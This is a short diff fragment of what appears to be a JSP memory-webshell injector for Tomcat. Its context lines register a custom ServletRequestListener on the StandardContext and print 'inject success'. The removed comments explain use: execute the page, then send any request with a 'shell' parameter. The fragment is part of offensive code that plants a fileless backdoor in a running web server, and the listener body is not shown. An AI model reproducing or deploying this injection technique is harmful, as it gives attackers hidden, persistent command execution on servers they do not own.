@@ -41,5 +41,3 @@ out.println("inject success");
 S servletRequestListener = new S();
 standardContext.addApplicationEventListener(servletRequestListener);
 %>
-<!-- 1、exec this-->
-<!-- 2、request any url with a parameter of "shell" -->
